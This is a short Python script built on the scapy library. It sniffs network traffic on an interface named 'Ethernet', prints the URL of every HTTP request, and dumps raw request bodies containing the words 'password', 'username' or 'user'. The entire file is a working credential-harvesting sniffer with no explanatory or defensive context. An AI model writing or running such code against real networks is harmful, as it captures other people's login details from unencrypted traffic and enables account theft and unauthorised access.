from scapy.all import *
from scapy.layers import http

def proccess_packet_http(packet):
    if packet.haslayer(http.HTTPRequest):
        print("Http")
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print('URL: ' + url.decode())
        if packet.haslayer(Raw):
            load = packet[Raw].load
            for i in words:
                if i in str(load):
                    print('Load: ' + load.decode())
                    break
    else:
        print("pkt")
        
words = ["password","username","user"]

def sn(interface):
    sniff(iface=interface,store=False,prn=proccess_packet_http)

sn("Ethernet")